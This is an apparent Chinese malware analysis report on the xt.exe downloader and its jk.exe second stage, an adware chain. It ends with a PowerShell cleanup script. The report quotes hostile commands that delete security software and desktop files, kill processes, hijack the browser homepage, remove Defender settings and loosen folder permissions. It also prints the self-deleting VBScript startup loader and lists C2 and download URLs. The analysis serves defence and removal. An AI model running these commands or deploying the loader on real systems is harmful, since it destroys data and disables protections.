# 关于xt.exe的分析报告

### 1. HASH

[https://s.threatbook.com/report/file/181ba66169e0a6d688f7d73e659...](https://s.threatbook.com/report/file/181ba66169e0a6d688f7d73e6598f9c3f8aaedee29e8acd38f80fdea1c9e249f)

```bash
SHA256:
181ba66169e0a6d688f7d73e6598f9c3f8aaedee29e8acd38f80fdea1c9e249f
MD5:
56f1da726769e349fe5c321313640976
SHA1:
02aeb9c1e337a104e225d7e7570b18e80ed04ee7
```

### 2. 初始样本分析 (`xt.exe`)

初始投递的`xt.exe`是一个使用Visual Basic 6编写的下载器。

**2.1 静态特征**

- ​**基础信息**：文件大小80KB，编译于2024年9月。文件版本信息伪装为“19.09.0006”，公司名称字段具有误导性。
- **关键字符串**：

  - ​`cmd /c rmdir /s /q "C:\Program Files\Tencent\QQBrowser"` - 强力删除QQ浏览器。
  - ​`cmd /c rmdir /s /q "C:\Program Files (x86)\360"`​ / `cmd /c rmdir /s /q "C:\Users\Administrator\AppData\Roaming\360se6"` - 针对360安全卫士、360浏览器及其数据。
  - ​`taskkill /f /im "360se.exe"`​ / `taskkill /f /im "SogouExplorer.exe"` - 强制结束360和安全进程。
  - ​`cmd /c del /s /q /f "C:\Users\Administrator\Desktop\`​ / `cmd /c del /s /q /f "C:\Users\public\Desktop\` - 删除用户和公共桌面上特定文件。
  - 针对 `Start Menu`​ 下 `360`​、`2345`​、`Tencent` 等目录的清理，移除这些程序的启动项和快捷方式。

  - ​**网络通信**​：硬编码了多个C2（命令与控制）相关域名，包括`tongji.uqitong.com`​、`tongji.uqidashi.com`​、`tongji.jisupe.com`​、`tongji.upzxt.com`​。同时包含`ipinfo.io`​、`jsonip.com`等用于获取受害者公网IP的地址。
  - **信息窃取准备**：出现了完整的MySQL ODBC 3.51驱动安装命令和配置字符串（`DRIVER={MySQL ODBC 3.51 Driver}`​），以及`INSERT INTO upzxtxt VALUES (null,'`等不完整的SQL语句，可能具备数据库窃取能力。
  - **自我操作**：包含删除自身注册表启动项的命令(`reg delete … /v xt /f`​)和修改自身目录权限的命令(`cacls.exe … /e /t /p everyone:f`)。

  ​**浏览器主页劫持**：

  - ​`reg add "HKEY_LOCAL_MACHINE\Software\...\Start Page" /v Start Page /t REG_SZ /d "http://www.hao385.com" /f`​ - 将IE浏览器主页锁定到 `hao385.com`（一个导航网站），这是典型的流量劫持和推广行为。
- **服务器**：

  - ​`tongji.uqitong.com`​， `tongji.uqidashi.com`​， `tongji.jisupe.com`​， `tongji.upzxt.com`​ - 这些域名很可能是木马的​**统计/控制服务器**，用于上报感染信息、接收指令、下载更新。
  - ​`http://0.uqidashi.com/0.txt`​ / `0md5.txt` - 在动态分析中实际访问了这些URL，用于获取配置或命令。

  - ​**获取受害者公网IP**：

    - ​`https://ipinfo.io/ip`​， `https://jsonip.com/`​， `http://api.ipify.org` - 用于获取感染机器的公网IP地址，这是对受害者进行地理位置定位和网络环境判断的关键信息。
  - ​**HTTP请求组件**：

    - ​`Microsoft.XMLHTTP`​， `WinHttp.WinHttpRequest.5.1` - 表明木马使用这些COM对象发起网络请求，用于下载文件或与C&C服务器通信。
  - ​**文件下载与执行**：

    - ​`http://download.lnzbxy.com/jkhhh/qqpcmgr_v13.3.20244.216_1100109869_0.exe`
    - ​`http://download.2345.cn/silence/2345Explorer_209411_silence.exe`
    - 这些是它计划下载的其他程序（很可能是流氓软件或捆绑包），显示其“下载器”功能。

**2.2 动态行为**  
在沙箱环境中，`xt.exe`​执行后立即启动网络活动，其首要行为是访问`http://0.uqidashi.com/0.txt`​。该文本文件内容为一条指令：`http://150.158.24.162/uqcjjj`​。样本随即下载该文件（即第二阶段的`jk.exe`​）并执行。此过程验证了其作为**下载器**的核心功能。

### 3. 第二阶段模块分析 (`jk.exe`)

被下载的`jk.exe`是攻击链条的深化，功能更具针对性。

**3.1 静态与功能分析**

- ​**版本更新**​：其编译时间戳晚于`xt.exe`，内部版本号显示为“25.00.0001”，表明该恶意家族持续更新。
- **核心任务——软件静默安装**：样本内包含大量从固定服务器`down123.uqitong.com`​下载的链接，目标文件名为`360se+243988+…exe`​、`360Safe+243988+…exe`​等。经在受感染主机`C:\Program Files\xt\`​目录下取证，这些文件确为带有数字签名、捆绑了特定推广ID安装包。病毒通过附带`/S`​、`--silent-install=3_1_1`​等参数实现静默安装。这揭示了攻击者的核心牟利模式之一：**通过劫持用户电脑安装软件赚取推广佣金**。

  ### C:\Program Files\xt\ 目录文件分析

  |文件名|大小|版本号|分析|
  | --------| ---------| ----------------| -------------------|
  |​**​`360se+243988+n451d131e9c.exe`​**|129 MB|15.2.5124.0|**安装包**，带推广ID (`243988`)|
  |​**​`360Safe+243988+n451d131e9c.exe`​**|116 MB|13.0.0.2236|**安装包**，带推广ID (`243988`)|
  |​**​`360zip_yqlm_243988.exe`​**|14.8 MB|4.0.0.1520|**安装包**，带推广参数 (`yqlm_243988`)|
  |​**​`XT.TXT`​**|12字节|文本内容: `uqitong`<br />||
- ​**对抗安全软件**​：新增了直接禁用Windows Defender的注册表删除命令（如删除`DisableAntiSpyware`​、`DisableAntiVirus`等键值），攻击性更强。
- ​**延续数据窃取能力**​：保留了与`xt.exe`​相同的MySQL连接字符串及`INSERT INTO az VALUES`等SQL语句，表明数据窃取是贯穿整个攻击链的持久目标。
- ​**配置与通信**​：发现其会从C2服务器查询定制化指令（`SELECT StrSoft FROM upzxtxt WHERE StrPc = ‘`​），并包含一个关键的配置文件`XT.TXT`，其内容为简单的“uqitong”，疑似作为客户端标识。

### 4. 持久化与隐蔽机制深度剖析

该病毒家族采用了多层、高隐蔽性的持久化方案。

**4.1 核心持久化：自删除VBScript加载器**  
分析进程日志发现，`xt.exe`​通常由`wscript.exe`​作为父进程启动。经排查，在`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\`​目录下发现文件`RunLoader.vbs`。其内容如下：

```
on error resume next
set ws=createobject("wscript.shell")
ws.run """%ProgramFiles%/XT/xt.exe"""
set fso = createobject("scripting.filesystemobject")
wscript.sleep 1000
fso.deletefile(wscript.scriptname)
```

​**机制解析**：

1. ​**触发**：利用Windows系统启动文件夹机制，用户登录时自动执行。
2. ​**加载**​：运行隐藏在`%ProgramFiles%\XT\`​目录下的主恶意程序`xt.exe`。
3. ​**销毁**​：等待1秒确保主程序启动后，​**立即删除自身VBS脚本文件**。  
   此设计实现了“无文件”持久化的效果，极大增加了检测和取证的难度。

**4.2 辅助持久化与维护**

- **注册表启动项**：虽然存在`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\xtLoader`​指向`xt.exe`​，但在多次运行中被发现为“disabled”状态。结合进程日志中频繁出现的`reg delete … /v xt /f`​记录，判断病毒会**主动删除自己的常规注册表启动项**，以降低暴露风险，完全依赖上述VBS脚本实现隐蔽启动。

  **病毒持久化项 (注册表启动项)**

  |项目|注册表路径|目标路径|状态|
  | ------| ------------| ----------| ------|
  |**xtLoader**|​`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\`|​`C:\Program Files\XT\xt.exe`|**disabled**|
- ​**权限维持**​：每次启动后，病毒都会通过`cacls.exe “C:\Program Files\xt” /e /t /p everyone:f`命令，为自身工作目录赋予所有用户完全控制权限，防止被安全软件或用户轻易删除。

### 5. 完整还原

综合所有分析，XT病毒家族的攻击链条可完整还原如下：

1. ​**初始入侵**​：`xt.exe`通过伪装、捆绑等方式进入受害主机。
2. ​**环境清理**：执行批量命令，删除或干扰可能与其竞争或构成威胁的其他软件。
3. ​**权限确立**：为自身目录设置高权限，建立稳固的“根据地”。
4. ​**获取指令**​：从`0.uqidashi.com`​下载配置文件，获取下一阶段载荷`jk.exe`的下载地址。
5. ​**部署第二阶段**​：下载并执行`jk.exe`。
6. ​**深度恶意操作**：

   - ​`jk.exe`​根据从服务器（`tongji.uqitong.com`等）查询到的指令，下载带有推广ID的正版软件进行静默安装，为攻击者牟利。
   - 尝试禁用系统防病毒软件（Windows Defender）。
   - 执行信息收集（系统信息、IP地址）和潜在的数据窃取活动（通过MySQL ODBC组件）。
7. **持久化隐蔽运行**：通过放置在系统启动文件夹中的自删除VBScript脚本，实现长期驻留。每次启动后执行权限维持、信息收集并清理部分痕迹。

   至此，这个病毒家族的**攻击动机（推广获利）** 、**核心组件（xt.exe, jk.exe）** 、**推广载荷（带ID的正版软件）**  和**通信标识（uqitong）**  已基本清晰。它是一个高度商业化、链条完整的恶意推广软件。

### 6.powershll 清理脚本

```bash
$items = @(
    @{Type="Process"; Name="xt"},
    @{Type="Process"; Name="xt1"},
    @{Type="Directory"; Path="C:\Program Files\xt"},
    @{Type="Directory"; Path="C:\Program Files\XT"},
    @{Type="File"; Path="C:\Program Files\XT\xt.exe"},
    @{Type="File"; Path="C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\RunLoader.vbs"},
    @{Type="Registry"; Path="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; Value="xtLoader"}
)

foreach ($item in $items) {
    switch ($item.Type) {
        "Process" {
            $proc = Get-Process -Name $item.Name -ErrorAction SilentlyContinue
            if ($proc) { "Process $($item.Name) FOUND" } else { "Process $($item.Name) NOT FOUND" }
            $proc | Stop-Process -Force -ErrorAction SilentlyContinue
            $procCheck = Get-Process -Name $item.Name -ErrorAction SilentlyContinue
            if (-not $procCheck) { "Process $($item.Name) KILLED" } else { "Process $($item.Name) KILL FAILED" }
        }
        "Directory" {
            if (Test-Path $item.Path) { "Directory $($item.Path) FOUND" } else { "Directory $($item.Path) NOT FOUND" }
            Remove-Item -Path $item.Path -Recurse -Force -ErrorAction SilentlyContinue
            cmd /c rmdir /s /q "$($item.Path)" 2>$null
            if (-not (Test-Path $item.Path)) { "Directory $($item.Path) DELETED" } else { "Directory $($item.Path) DELETE FAILED" }
        }
        "File" {
            if (Test-Path $item.Path) { "File $($item.Path) FOUND" } else { "File $($item.Path) NOT FOUND" }
            Remove-Item -Path $item.Path -Force -ErrorAction SilentlyContinue
            if (-not (Test-Path $item.Path)) { "File $($item.Path) DELETED" } else { "File $($item.Path) DELETE FAILED" }
        }
        "Registry" {
            $reg = Get-ItemProperty -Path $item.Path -Name $item.Value -ErrorAction SilentlyContinue
            if ($reg) { "Registry $($item.Value) FOUND" } else { "Registry $($item.Value) NOT FOUND" }
            Remove-ItemProperty -Path $item.Path -Name $item.Value -Force -ErrorAction SilentlyContinue
            $regCheck = Get-ItemProperty -Path $item.Path -Name $item.Value -ErrorAction SilentlyContinue
            if (-not $regCheck) { "Registry $($item.Value) DELETED" } else { "Registry $($item.Value) DELETE FAILED" }
        }
    }
    ""
}
```
